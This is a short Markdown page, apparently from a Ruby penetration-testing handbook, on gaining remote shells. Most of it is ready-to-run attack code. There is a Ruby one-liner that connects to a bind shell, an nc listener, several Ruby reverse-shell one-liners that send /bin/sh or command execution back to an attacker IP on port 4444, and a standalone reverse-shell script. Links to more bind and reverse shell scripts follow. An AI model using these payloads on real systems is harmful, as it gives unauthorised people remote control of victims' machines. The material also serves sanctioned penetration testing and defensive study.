# Remote Shell

Remote shell means s forward or reverse connection to the target system command-line\(shell\).

**Note:** For windows systems, replace the "/bin/sh" to "cmd.exe"

## Connect to Bind shell

from terminal

```ruby
ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop{gets.chomp!;$_=="exit"?(s.close;exit):(s.puts$_);puts s.recv 0xFFFF}'
```

since `192.168.0.15` is the victim IP

## Reverse shell

Attacker is listening on port 4444 `nc -lvp 4444`. Now on victim machine run

```ruby
ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

if you don't want to rely on `/bin/sh`

```ruby
ruby -rsocket -e'exit if fork;c=TCPSocket.new("192.168.0.13",4444);loop{c.gets.chomp!;($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

if you don't want to rely on `cmd.exe`

```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

since `192.168.0.13` is the attacker IP

If you want it more flexible script file

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'socket'
if ARGV[0].nil? || ARGV[1].nil?
    puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
    exit
end
ip, port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
```

## Bind and Reverse shell

This is an awesome implementation for a standalone [bind](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/bind.rb) and [reverse](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/rubyrev.rb) shells scripts written by \[Hood3dRob1n\]\[3\] on GitHub . The bind shell requires authentication while reverse is not.

\[3\]: [https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells)

